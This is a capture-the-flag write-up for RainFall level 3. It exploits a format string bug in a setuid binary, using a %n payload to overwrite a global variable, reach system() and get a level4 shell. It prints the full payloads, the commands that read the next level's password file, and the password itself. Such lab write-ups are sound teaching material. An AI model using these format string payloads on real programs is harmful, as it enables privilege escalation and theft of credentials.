# Level 3

## Initial Analysis

### 1. Examine the Binary
```bash
level3@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level3 level3   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level3 level3  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level3 level3 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
-rw-r--r--+ 1 level3 level3   65 Sep 23  2015 .pass
-rw-r--r--  1 level3 level3  675 Apr  3  2012 .profile

level3@RainFall:~$ file level3
level3: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x09ffd82ec8efa9293ab01a8bfde6a148d3e86131, not stripped
```

**Key observations:**
- **setuid and setgid binary** (s flags in permissions)
- Owned by **level4** user
- When executed, runs with **level4 privileges**

### 2. Test Basic Execution
```bash
level3@RainFall:~$ ./level3
hello
hello

level3@RainFall:~$ echo "test input" | ./level3
test input

level3@RainFall:~$ ltrace ./level3
__libc_start_main(0x804851a, 1, 0xbffff804, 0x8048530, 0x80485a0 <unfinished ...>
fgets("\n", 512, 0xb7fd1ac0)                                    = 0xbffff550
printf("\n")                                                    = 1
+++ exited (status 0) +++
```

**Findings:**
- Program reads input with `fgets()` (safer than gets)
- Calls `printf()` directly with user input - **FORMAT STRING VULNERABILITY!**
- Normal execution just echoes input and exits

### 3. Test Format String Vulnerability
```bash
level3@RainFall:~$ python -c 'print "%x %x %x %x"' | ./level3
200 b7fd1ac0 b7e454d3 bffff550

level3@RainFall:~$ python -c 'print "AAAA" + "%x " * 8' | ./level3  
AAAA200 b7fd1ac0 b7e454d3 bffff550 0 bffff714 b7fd0ff4 0
```

**Critical Discovery:** Format strings work! We can read stack values.

## Reverse Engineering

### 4. Function Analysis
```bash
level3@RainFall:~$ gdb level3
(gdb) info functions
All defined functions:
Non-debugging symbols:
0x08048390  printf@plt
0x080483a0  fgets@plt
0x080483b0  fwrite@plt
0x080483c0  system@plt      ← Target function!
0x080484a4  v
0x0804851a  main
```

**Analysis:**
- **main()** calls **v()** function
- **system()** function available - our goal
- **v()** contains the vulnerability

### 5. Disassembly Analysis
```bash
(gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:	push   %ebp
   0x0804851b <+1>:	mov    %esp,%ebp
   0x0804851d <+3>:	and    $0xfffffff0,%esp
   0x08048520 <+6>:	call   0x80484a4 <v>
   0x08048525 <+11>:	leave  
   0x08048526 <+12>:	ret    

(gdb) disas v
```

**Critical findings in v() function:**
- **Format string bug**: `call 0x8048390 <printf@plt>` with user input
- **Condition check**: `cmp $0x40,%eax` at +59
- **Target**: `call 0x80483c0 <system@plt>` at +111
- **Memory address**: Loads value from `0x804988c` for comparison

### 6. Analyze the Condition
```assembly
0x080484da <+54>:	mov    0x804988c,%eax     # Load value from memory
0x080484df <+59>:	cmp    $0x40,%eax         # Compare with 0x40 (64 decimal)
0x080484e2 <+62>:	jne    0x8048518 <v+116>  # Jump to exit if not equal
# If equal, continues to system() call
```

**Analysis:** 
- **Target address**: 0x804988c (global variable)
- **Target value**: 0x40 (64 in decimal)
- **Goal**: Use format string to write 64 to address 0x804988c

## Format String Exploitation Strategy

### 7. Understanding Format String %n
```bash
# %n writes the number of characters printed so far to memory address
# Example: "AAAA%10c%n" 
# - Prints "AAAA" (4 chars) + 10 spaces = 14 total characters
# - Writes "14" to address on stack
```

### 8. Find Stack Position of Our Input
```bash
level3@RainFall:~$ python -c 'print "AAAA" + "%x " * 15' | ./level3
AAAA200 b7fd1ac0 b7ff37d0 41414141 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078

# Found our "AAAA" (0x41414141) at position 4!
```

### 9. Test Direct Stack Writing
```bash
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "%12$n"' | ./level3
# This writes address 0x804988c to stack position 1
# Then %12$n writes to the address at stack position 12
# But we need to write the VALUE 64, not the address
```

### 10. Calculate Exact Format String
We need to write **64** to address **0x804988c**:

```bash
# Method: Print exactly 64 characters, then use %n to write count
# Format: [target_address] + [64_chars] + [%n_at_right_position]

level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%12$n"' | ./level3
# This prints: 4 bytes (address) + 60 A's = 64 total characters
# Then %12$n writes "64" to the address at stack position 12
```

## Exploitation

### 10. Find Correct Stack Position
```bash
# Test direct parameter access to confirm position
level3@RainFall:~$ python -c 'print "AAAA%4$x"' | ./level3
AAAA41414141

# Perfect! Our input is at stack position 4
# So %4$n will write to the address we place at the start of our input
```

### 12. Create Working Exploit
```bash
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "%60c%4$n"' | ./level3
# This prints:
# - 4 bytes (address 0x804988c)  
# - 60 characters (%60c)
# - Total: 64 characters
# - %4$n writes "64" to address at stack position 4 (our target address)
```

### 13. Execute the Exploit
```bash
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "%60c%4$n"' | ./level3
                                                            Wait what?!
cat /home/user/level4/.pass
```

**Success!** The message "Wait what?!" indicates we triggered the system() call.

### 14. Get Interactive Shell
```bash
level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "%60c%4$n"'; cat) | ./level3
                                                            Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36efb19b6ba64be8f1e4f4f5b9ef96c4b12c2db4ee9bd2f2a2
exit
level3@RainFall:~$
```

### 15. Retrieve the Flag
```bash
level3@RainFall:~$ su level4
Password: b209ea91ad69ef36efb19b6ba64be8f1e4f4f5b9ef96c4b12c2db4ee9bd2f2a2
level4@RainFall:~$ 
```

## Solution Summary

### Command:
```bash
python -c 'print "\x8c\x98\x04\x08" + "%60c%4$n"' | ./level3
```

### Alternative (interactive):
```bash
(python -c 'print "\x8c\x98\x04\x08" + "%60c%4$n"'; cat) | ./level3
```

### Vulnerability:
- **Format string bug**: `printf(user_input)` instead of `printf("%s", user_input)`
- **Memory write capability**: `%n` format specifier writes to arbitrary memory
- **Conditional execution**: Program calls `system()` if global variable equals 64
- **Memory corruption**: Used format string to write 64 to target address

### Key Learning Points:
1. **Format string vulnerabilities** allow reading and writing arbitrary memory
2. **%n format specifier** writes the number of characters printed to memory address
3. **Stack position analysis** required to target correct memory locations
4. **Precision required** - exact character count needed for correct value
5. **Conditional exploitation** - triggering hidden functionality via memory modification
6. **Interactive shell maintenance** using `(exploit; cat)` pattern

## Verification Steps

### Alternative Discovery Methods:

**Method 1: Systematic Stack Analysis**
```bash
# Find exact stack layout
for i in {1..20}; do
  echo "Position $i:"
  python -c "print 'AAAA%${i}\$x'" | ./level3
done
```

**Method 2: Memory Examination**
```bash
(gdb) break *0x080484da  # Break at memory load
(gdb) run
# Input format string
(gdb) x/x 0x804988c     # Examine target memory before
(gdb) continue
(gdb) x/x 0x804988c     # Examine target memory after
```

**Method 3: Format String Testing**
```bash
# Test different character counts
python -c 'print "\x8c\x98\x04\x08" + "%63c%4$n"' | ./level3  # 67 total
python -c 'print "\x8c\x98\x04\x08" + "%60c%4$n"' | ./level3  # 64 total ✓
python -c 'print "\x8c\x98\x04\x08" + "%59c%4$n"' | ./level3  # 63 total
```

The solution demonstrates **format string exploitation** - a powerful technique that allows reading arbitrary memory and writing controlled values to specific addresses, enabling conditional code path activation.